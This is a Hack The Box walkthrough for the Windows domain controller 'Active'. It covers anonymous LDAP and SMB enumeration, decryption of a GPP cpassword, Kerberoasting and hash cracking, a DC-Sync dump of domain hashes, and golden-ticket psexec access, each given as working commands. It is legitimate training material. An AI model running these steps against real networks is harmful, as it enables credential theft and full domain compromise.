+++
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Kerberoasting", "Kerberos", "cpassword", "Active Directory"]
draft = false
title = "Active HTB Walkthrough"
author = "bloodstiller"
date = 2024-11-02
+++

## Active Hack The Box Walkthrough/Writeup: {#active-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Active>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Active/scans/nmap  🍣 main 📝 ×115🛤️  ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 21:57:59 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:58 GMT
        Nmap scan report for 10.129.58.199
        Host is up (0.041s latency).
        Not shown: 983 closed tcp ports (reset)
        PORT      STATE SERVICE
        53/tcp    open  domain
        88/tcp    open  kerberos-sec
        135/tcp   open  msrpc
        139/tcp   open  netbios-ssn
        389/tcp   open  ldap
        445/tcp   open  microsoft-ds
        464/tcp   open  kpasswd5
        593/tcp   open  http-rpc-epmap
        636/tcp   open  ldapssl
        3268/tcp  open  globalcatLDAP
        3269/tcp  open  globalcatLDAPssl
        49152/tcp open  unknown
        49153/tcp open  unknown
        49154/tcp open  unknown
        49155/tcp open  unknown
        49157/tcp open  unknown
        49158/tcp open  unknown

        Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds

        ```
    -   **Initial thoughts**:
        -   SMB, Kerberos, SMB, LDAP &amp; RPC are great enumeration targets


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Active/scans/nmap  🍣 main 📝 ×115🛤️  ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 21:58:38 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:59 GMT
    Nmap scan report for 10.129.58.199
    Host is up (0.040s latency).
    Not shown: 65512 closed tcp ports (reset)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid:
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-01 15:05:52Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5722/tcp  open  msrpc         Microsoft Windows RPC
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49152/tcp open  msrpc         Microsoft Windows RPC
    49153/tcp open  msrpc         Microsoft Windows RPC
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49162/tcp open  msrpc         Microsoft Windows RPC
    49166/tcp open  msrpc         Microsoft Windows RPC
    49168/tcp open  msrpc         Microsoft Windows RPC
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=11/1%OT=53%CT=1%CU=39275%PV=Y%DS=2%DC=I%G=Y%TM=6725
    OS:510D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%CI=I%II=I%TS=7)SEQ(S
    OS:P=105%GCD=1%ISR=104%TI=I%CI=I%II=I%TS=7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST1
    OS:1%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%
    OS:W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CN
    OS:W8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
    OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
    OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D
    OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8
    OS:0%CD=Z)

    Network Distance: 2 hops
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode:
    |   2:1:0:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-11-01T15:07:00
    |_  start_date: 2024-11-01T14:46:20
    |_clock-skew: -7h00m00s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 452.68 seconds
    ```


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 ldapchecker.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in HTB/BlogEntriesMade/Active/scans/ldap  🍣 main 📝 ×115🛤️  ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 22:00:23 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
        Attempting to connect to 10.129.58.199 with SSL...
        Failed to connect with SSL.
        Attempting to connect to 10.129.58.199 with non-SSL...
        Connected successfully using anonymous bind. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=active,DC=htb
            CN=Configuration,DC=active,DC=htb
            CN=Schema,CN=Configuration,DC=active,DC=htb
            DC=DomainDnsZones,DC=active,DC=htb
            DC=ForestDnsZones,DC=active,DC=htb
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
        domainFunctionality:
            4
          forestFunctionality:
            4
          domainControllerFunctionality:
            4
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 4 which means that this server has to be running Windows Server 2008 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.
    -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`
    -   {{< figure src="/ox-hugo/2024-11-01-150220_.png" >}}


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
-   {{< figure src="/ox-hugo/2024-11-01-164519_.png" >}}
-   Nothing of note just standard dns entries for a DC.


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   **As kerberos is present we can enumerate users using** [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-11-01-164603_.png" >}}
    -   Nothing of note.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u '' -p '' --shares`
        -   Null session is valid:
        -   {{< figure src="/ox-hugo/2024-11-01-150541_.png" >}}
        -   We can see we can access the replication Share:
    -   `netexec smb $box -u 'guest' -p '' --shares`
        -   Guest account is disabled:
        -   {{< figure src="/ox-hugo/2024-11-01-150455_.png" >}}


### Enumerating the Replication share using smbclient: {#enumerating-the-replication-share-using-smbclient}

-   As we can connect using a null session we can use smbclient to enumerate the replication share:
    -   `smbclient -N "\\\\$box\\Replication"`
    -   {{< figure src="/ox-hugo/2024-11-01-151233_.png" >}}

-   **Enumerating the share I find a** `Groups.xml` **file in the** `Polices` **folder**:
    -   {{< figure src="/ox-hugo/2024-11-01-151727_.png" >}}
-   I download it:
    -   `get {31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`
    -   {{< figure src="/ox-hugo/2024-11-01-151837_.png" >}}


### Finding hard-coded creds for SVC_TGS user: {#finding-hard-coded-creds-for-svc-tgs-user}

-   **In the Groups.xml I find hard-coded credentials, albeit hashed in the file**.
    -   {{< figure src="/ox-hugo/2024-11-01-152002_.png" >}}


#### cpassword primer: {#cpassword-primer}

-   **TL'DR**: The `cpassword` attribute in Group Policy Preferences (GPP) stores encrypted passwords for accounts configured through GPP. This can be decrypted using `gpp-decrypt` (in kali).

-   **Purpose and Function**:
    -   **Purpose**: Used in GPP to store passwords for tasks like setting local administrator accounts, mapping network drives, and configuring services. (in this case the SVC_TGS service)
    -   **Attribute**: Appears in the XML files of GPP as `cpassword`, storing the encrypted password value.
    -   **Files**: Typically found in `SYSVOL` folder of a domain, making it accessible to any domain user.
        -   However as you can see it can be present in any share.

-   **Encryption and Format**:
    -   **Encryption**: AES-256-CBC, but with a +static key+ that was hardcoded by Microsoft.
        -   You read that right, MS hardcoded the a static key for this&#x2026;.
    -   **Key Problem**: The static encryption key is publicly known, which effectively nullifies the security benefits of encryption. We can decrypt it using the tool [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
    -   **Encoding**: The encrypted password is Base64-encoded, making it readable as an alphanumeric string in XML files.

-   **Vulnerability and Security Concerns**:
    -   **Access and Exploitability**: Since the `SYSVOL` share is accessible to all authenticated domain users, anyone can read the XML files containing `cpassword`.
    -   **Decryption**: Due to the static key, tools like `gpp-decrypt` (or manual decryption using the known key) can easily decrypt the password.
    -   **Privilege Escalation**: Attackers, like us, can leverage `cpassword` to obtain plaintext passwords, often leading to **privilege escalation** by compromising local or service accounts with elevated privileges.

-   **Microsoft's response to the key disclosure**:
    -   Microsoft discontinued the use of `cpassword` in GPP with a patch in 2014 (`MS14-025`), which removed the ability to set passwords in GPP.
        -   The only reason this is present on this machine is that it's running windows server 2008.
    -   Microsoft advised using more secure methods like `LAPS (Local Administrator Password Solution)` for managing local administrator credentials.

-   **Mitigation and Detection**
    -   **Removal of Legacy GPPs**: Ensure any remaining GPP configurations with `cpassword` are removed from domain controllers.
    -   **Access Controls**: Limit access to the `SYSVOL` share, though this is challenging due to default domain-wide access.
    -   **Use of LAPS**: Implementing LAPS or other secure solutions for local password management can prevent similar vulnerabilities.


### Decrypting the SVC_TGS password using gpp-decrypt: {#decrypting-the-svc-tgs-password-using-gpp-decrypt}

-   **I decrypt the password using** `gpp-decrypt`:
    -   `gpp-decrypt [hash]`
    -   {{< figure src="/ox-hugo/2024-11-01-162031_.png" >}}

-   **Checking if the creds are valid**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-01-164814_.png" >}}
    -   Looks like we have access to `Users` share


## 2. Foothold: {#2-dot-foothold}


### Enumerating Users with impacket-lookupsid: {#enumerating-users-with-impacket-lookupsid}

-   As we have valid creds now I like to enumerate all users groups on the domain.
-   **We can use** `impacket-lookupsid` **to enumerate users on the domain**:
    -   `impacket-lookupsid $domain/$user@$machine.$domain -domain-sids`
    -   {{< figure src="/ox-hugo/2024-11-01-165210_.png" >}}
    -   Not many users on the domain.


### Enumerating the users share as SVC_TGS: {#enumerating-the-users-share-as-svc-tgs}

-   **I connect as the SVC_TGS user using smbclient**:
    -   `smbclient -U $user  "\\\\$box\\Users"`

-   **Looking at the share it's user home folders**:
    -   {{< figure src="/ox-hugo/2024-11-01-175322_.png" >}}

-   **I try and access the administrator folder but I am denied**:
    -   {{< figure src="/ox-hugo/2024-11-01-175352_.png" >}}

-   **Checking our home folder I retrieve the user flag**
    -   {{< figure src="/ox-hugo/2024-11-01-175419_.png" >}}
    -   {{< figure src="/ox-hugo/2024-11-01-175440_.png" >}}


### I query all users and groups using rpcclient: {#i-query-all-users-and-groups-using-rpcclient}

-   This does provide any additional information.
    -   {{< figure src="/ox-hugo/2024-11-01-181519_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Extracting the Administrator Hash via Kerberoasting: {#extracting-the-administrator-hash-via-kerberoasting}

-   **I try kerberoasting with netexec**:
    -   `netexec ldap $box -u $user -p $pass --kerberoasting kerb.out`
    -   I get a hit for the administrator:
        -   {{< figure src="/ox-hugo/2024-11-01-183154_.png" >}}
    -   +Note+: It's good practice to try Kerberoasting when we have creds as it can provide an easy win.


### Cracking the Admin Hash: {#cracking-the-admin-hash}

-   `hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt`
-   {{< figure src="/ox-hugo/2024-11-02-165034_.png" >}}
-   We crack it:
    -   {{< figure src="/ox-hugo/2024-11-02-165100_.png" >}}

-   **I check the cred using netexec &amp; it works**:
    -   {{< figure src="/ox-hugo/2024-11-02-165348_.png" >}}


## 4. Ownership: {#4-dot-ownership}


### Cracking the Admin Hash to reveal the clear-text password {#cracking-the-admin-hash-to-reveal-the-clear-text-password}

-   `hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt`
-   {{< figure src="/ox-hugo/2024-11-02-165034_.png" >}}
-   We crack it and :
    -   {{< figure src="/ox-hugo/2024-11-02-165100_.png" >}}

-   **I check the cred using netexec &amp; it works**:
    -   {{< figure src="/ox-hugo/2024-11-02-165348_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Dumping NTDS.dit/DC-SYNC attack: {#dumping-ntds-dot-dit-dc-sync-attack}

-   **Perform DC-Sync attack using netexec**:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-11-02-170306_.png" >}}

-   **Extract all hashes from netexec**
    -   `cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'`
    -   {{< figure src="/ox-hugo/2024-11-02-171538_.png" >}}


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

-   **Using** `impacket-lookupsid` **to get the Search for the Domain SID**:
    -   `impacket-lookupsid $domain/$user@$machine.$domain -domain-sids`
    -   {{< figure src="/ox-hugo/2024-11-02-170758_.png" >}}
        -   `S-1-5-21-405608879-3187717380-1996298813`

-   **Sync our clock to the host using ntupdate**:
    -   `sudo ntpdate -s $domain`
    -   {{< figure src="/ox-hugo/2024-11-02-170903_.png" >}}

-   **Using** `impacket-ticketer` **to create the Golden Ticket**:
    -   `impacket-ticketer -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator`
    -   {{< figure src="/ox-hugo/2024-11-02-171723_.png" >}}

-   **Export the ticket to the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./Administrator.ccache`
    -   {{< figure src="/ox-hugo/2024-11-02-171801_.png" >}}

-   **Use the ticket for connecting via** `psexec`
    -   `impacket-psexec -k -no-pass $machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-02-171912_.png" >}}

-   **Lets get the root flag**:
    -   {{< figure src="/ox-hugo/2024-11-02-172227_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  Try simple, kerberoast when we have creds can lead to easy wins and privesc paths.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Had a brainfart in regards to using psexec that was fun.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


